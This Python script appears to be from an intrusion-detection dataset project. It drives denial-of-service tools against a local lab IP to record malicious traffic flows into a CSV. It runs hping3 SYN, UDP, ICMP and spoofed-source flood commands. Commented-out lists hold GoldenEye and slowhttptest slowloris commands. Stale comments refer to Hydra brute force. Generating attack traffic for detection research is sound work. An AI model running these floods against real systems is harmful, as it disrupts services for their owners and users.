import subprocess
import time
import os
from dotenv import load_dotenv

load_dotenv()
repo_path = os.getenv('REPOSITORY_PATH')
CSV_FILE = os.path.join(repo_path, "./data/df/df_malign_captured_cleaned.csv")
LINES_PER_COMMAND = 100

target_ip = "192.168.1.178"
'''
commands = [
    f"python3 goldeneye.py {target_ip} -w 50 -s 30 -m get",
    f"python3 goldeneye.py {target_ip} -w 100 -s 50 -m post",
    f"python3 goldeneye.py {target_ip} -w 20 -s 10 -m random",
    f"python3 goldeneye.py {target_ip}/index.php -w 80 -s 40 -m get",
    f"python3 goldeneye.py {target_ip} -u ./res/lists/useragents -w 50",
    f"python3 goldeneye.py {target_ip} -w 200 -s 100 -m get -d", 
    f"python3 goldeneye.py {target_ip}/login.php -w 60 -s 30 -m post",
    f"python3 goldeneye.py {target_ip} -w 10 -s 500 -m get", 
    f"python3 goldeneye.py {target_ip} -w 150 -s 20 -m random",
    f"python3 goldeneye.py {target_ip} -w 50 -s 30 -m get -n" 
]

commands = [
    f"slowhttptest -c 1000 -H -g -o slowloris -i 10 -r 200 -t GET -u {target_ip}",
    f"slowhttptest -c 500 -B -g -o slowpost -i 110 -r 100 -s 8192 -t POST -u {target_ip}",
    f"slowhttptest -c 1000 -X -r 200 -w 512 -y 1024 -n 5 -z 32 -u {target_ip}",
    f"slowhttptest -c 2000 -H -i 5 -r 500 -u {target_ip}", 
    f"slowhttptest -c 1000 -B -r 100 -u {target_ip}/index.php",
    f"slowhttptest -c 500 -H -t GET -u {target_ip} -x 24 -p 3",
    f"slowhttptest -c 800 -X -u {target_ip}",
    f"slowhttptest -c 1200 -B -s 4096 -t POST -u {target_ip}",
    f"slowhttptest -c 1000 -H -r 300 -u {target_ip}/index.php",
    f"slowhttptest -c 600 -B -i 50 -u {target_ip}"
]
'''
commands = [
    f"sudo hping3 -S --flood -V -p 80 {target_ip}",
    f"sudo hping3 --udp --flood -V -p 53 {target_ip}", 
    f"sudo hping3 -1 --flood -V {target_ip}", 
    f"sudo hping3 -A --flood -p 80 {target_ip}", 
    f"sudo hping3 -F -P -U --flood -p 80 {target_ip}",
    f"sudo hping3 -S -p 80 -c 5000 {target_ip}", 
    f"sudo hping3 --rand-source -S -L 0 -p 80 --flood {target_ip}", 
    f"sudo hping3 -2 --flood -p 123 {target_ip}", 
    f"sudo hping3 --xmas --flood -p 80 {target_ip}",
    f"sudo hping3 -S -A -F -R --flood -p 80 {target_ip}" 
]

def count_lines(file_path):
    """Cuenta líneas del CSV de forma segura."""
    if not os.path.exists(file_path):
        return 0
    try:
        with open(file_path, "r") as f:
            return sum(1 for _ in f)
    except Exception:
        return 0

for idx, command in enumerate(commands):
    print(f">> {command}")
    
    start_lines = count_lines(CSV_FILE)
    
    # Lanzar Hydra ignorando su salida para no colapsar la consola
    process = subprocess.Popen(
        command,
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

    try:
        while True:
            current_lines = count_lines(CSV_FILE)
            # Diferencia de 100 líneas detectadas
            if current_lines >= start_lines + LINES_PER_COMMAND:
                print(f"Umbral alcanzado: {LINES_PER_COMMAND} flujos capturados.")
                break
            
            # Si Hydra termina (ej. encontró la password o acabó el diccionario), saltar
            if process.poll() is not None:
                print("El ataque terminó antes de las 100 líneas. Pasando al siguiente...")
                break
                
    finally:
        print("Deteniendo proceso...")
        process.terminate()
        process.wait()
        print("Listo.")

print("\nGeneración de Fuerza Bruta variada completada.")